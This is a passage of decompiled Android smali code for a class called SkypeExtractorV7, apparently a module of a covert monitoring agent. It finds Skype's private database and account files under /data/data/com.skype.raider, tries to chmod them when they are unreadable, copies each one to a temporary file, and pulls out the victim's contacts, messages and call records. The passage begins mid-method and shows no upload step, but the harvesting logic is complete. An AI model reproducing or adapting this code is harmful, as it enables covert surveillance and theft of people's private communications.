    invoke-virtual {v2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, ")"

    invoke-virtual {v2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    goto :goto_1

    .line 733
    :cond_2
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, " "

    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    .line 736
    :goto_1
    invoke-interface {p1}, Landroid/database/Cursor;->isLast()Z

    move-result v0

    if-nez v0, :cond_1

    .line 737
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, ", "

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    :cond_3
    if-eqz p1, :cond_4

    .line 750
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    :cond_4
    return-object p3

    :catchall_0
    move-exception p2

    goto :goto_4

    :catch_0
    move-exception p2

    move-object v0, p1

    goto :goto_3

    :cond_5
    :goto_2
    :try_start_2
    const-string p2, "unknown"
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    if-eqz p1, :cond_6

    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    :cond_6
    return-object p2

    :catchall_1
    move-exception p2

    move-object p1, v0

    goto :goto_4

    :catch_1
    move-exception p2

    .line 744
    :goto_3
    :try_start_3
    invoke-virtual {p2}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    if-eqz v0, :cond_7

    .line 750
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    :cond_7
    const-string p1, "unknown"

    return-object p1

    :goto_4
    if-eqz p1, :cond_8

    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    .line 752
    :cond_8
    throw p2
.end method

.method protected extractSkypeUsername()Ljava/lang/String;
    .locals 4

    const-string v0, "/data/data/com.skype.raider/files/shared.xml"

    const-string v1, "/config/Lib/Account/Default[1]"

    const/4 v2, 0x0

    .line 611
    :try_start_0
    new-instance v3, Ljava/io/File;

    invoke-direct {v3, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 612
    invoke-static {}, Ljavax/xml/parsers/DocumentBuilderFactory;->newInstance()Ljavax/xml/parsers/DocumentBuilderFactory;

    move-result-object v0

    .line 613
    invoke-virtual {v0}, Ljavax/xml/parsers/DocumentBuilderFactory;->newDocumentBuilder()Ljavax/xml/parsers/DocumentBuilder;

    move-result-object v0

    .line 615
    invoke-virtual {v0, v3}, Ljavax/xml/parsers/DocumentBuilder;->parse(Ljava/io/File;)Lorg/w3c/dom/Document;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-nez v0, :cond_0

    return-object v2

    .line 626
    :cond_0
    invoke-static {}, Ljavax/xml/xpath/XPathFactory;->newInstance()Ljavax/xml/xpath/XPathFactory;

    move-result-object v3

    invoke-virtual {v3}, Ljavax/xml/xpath/XPathFactory;->newXPath()Ljavax/xml/xpath/XPath;

    move-result-object v3

    .line 629
    :try_start_1
    invoke-interface {v3, v1}, Ljavax/xml/xpath/XPath;->compile(Ljava/lang/String;)Ljavax/xml/xpath/XPathExpression;

    move-result-object v1

    invoke-interface {v1, v0}, Ljavax/xml/xpath/XPathExpression;->evaluate(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0
    :try_end_1
    .catch Ljavax/xml/xpath/XPathExpressionException; {:try_start_1 .. :try_end_1} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 631
    invoke-virtual {v0}, Ljavax/xml/xpath/XPathExpressionException;->printStackTrace()V

    return-object v2

    :catch_1
    move-exception v0

    .line 617
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    return-object v2
.end method

.method public isReadable(Ljava/lang/String;)Z
    .locals 1

    .line 654
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 656
    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result p1

    return p1
.end method

.method protected parseProfileFromPath(Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    const-string v0, "unknown"

    const-string v1, "live:"

    const-string v2, "live#3a"

    .line 525
    invoke-virtual {p1, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    add-int/lit8 v2, v2, 0x7

    const-string v3, "/"

    .line 527
    invoke-virtual {p1, v3}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v4, -0x1

    if-eq v2, v4, :cond_1

    if-eq v3, v4, :cond_1

    if-gt v2, v3, :cond_1

    if-ne v2, v3, :cond_0

    goto :goto_0

    .line 534
    :cond_0
    :try_start_0
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    :catch_0
    return-object v0

    :cond_1
    :goto_0
    return-object v0
.end method

.method public run()V
    .locals 9

    const-string v0, "SkypeTmpFile"

    .line 88
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    .line 94
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->detectDatabaseFiles()Ljava/util/List;

    move-result-object v0

    .line 101
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_5

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    .line 107
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->isReadable(Ljava/lang/String;)Z

    move-result v2

    const/4 v3, 0x3

    if-nez v2, :cond_0

    const/4 v2, 0x0

    .line 108
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {p0, v1, v2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v2

    if-nez v2, :cond_0

    .line 109
    iget-object v2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "SkypeExtractorV7"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "chroot failed on (file): "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v2, v4, v5, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 117
    :cond_0
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 119
    invoke-virtual {v2}, Ljava/io/File;->isFile()Z

    move-result v4

    if-nez v4, :cond_1

    .line 120
    iget-object v2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "SkypeExtractorV7"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Database file is not a file at:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v2, v4, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_0

    .line 125
    :cond_1
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-nez v4, :cond_2

    .line 126
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SkypeExtractorV7"

    const-string v4, "Database file does not exist."

    invoke-interface {v1, v2, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_0

    .line 131
    :cond_2
    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v4

    const-wide/16 v6, 0x0

    cmp-long v8, v4, v6

    if-nez v8, :cond_3

    .line 132
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SkypeExtractorV7"

    const-string v4, "Database file is 0L long."

    invoke-interface {v1, v2, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_0

    :cond_3
    const/4 v3, 0x0

    :try_start_0
    const-string v4, "SkypeTmpFile"

    const-string v5, "db"

    .line 145
    iget-object v6, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->context:Lcom/hp/vd/context/Context;

    .line 148
    invoke-virtual {v6}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    invoke-virtual {v6}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v6

    invoke-virtual {v6}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v6

    .line 145
    invoke-static {v4, v5, v6}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v4
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    .line 151
    :try_start_1
    invoke-virtual {p0, v2, v4}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 171
    :try_start_2
    invoke-virtual {v4}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    const/16 v5, 0x10

    invoke-static {v2, v3, v5}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v2
    :try_end_2
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_2 .. :try_end_2} :catch_0

    .line 184
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->parseProfileFromPath(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 186
    invoke-virtual {p0, v2, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->extractContacts(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V

    .line 187
    invoke-virtual {p0, v2, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->extractMessages(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V

    .line 188
    invoke-virtual {p0, v2, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->extractCalls(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V

    .line 190
    invoke-virtual {v2}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    .line 191
    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    goto/16 :goto_0

    :catch_0
    move-exception v1

    .line 173
    iget-object v2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "SkypeExtractorV7"

    const-string v5, "Exception caught while opening database."

    invoke-interface {v2, v3, v5, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 175
    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    goto/16 :goto_0

    :catch_1
    move-exception v1

    move-object v3, v4

    goto :goto_1

    :catch_2
    move-exception v1

    :goto_1
    const-string v4, "unknown"

    if-eqz v3, :cond_4

    .line 156
    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    .line 159
    :cond_4
    iget-object v3, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v5, "SkypeExtractorV7"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Exception copying the temp database from:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ", to: "

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v3, v5, v2, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto/16 :goto_0

    :cond_5
    return-void
.end method

.method protected safeExtractMaxId(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Integer;
    .locals 1

    const/4 v0, 0x0

    .line 494
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 495
    invoke-virtual {p1, p2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_0

    .line 498
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    goto :goto_0

    .line 501
    :cond_0
    :try_start_0
    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 503
    :catch_0
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    :goto_0
    return-object p1
.end method
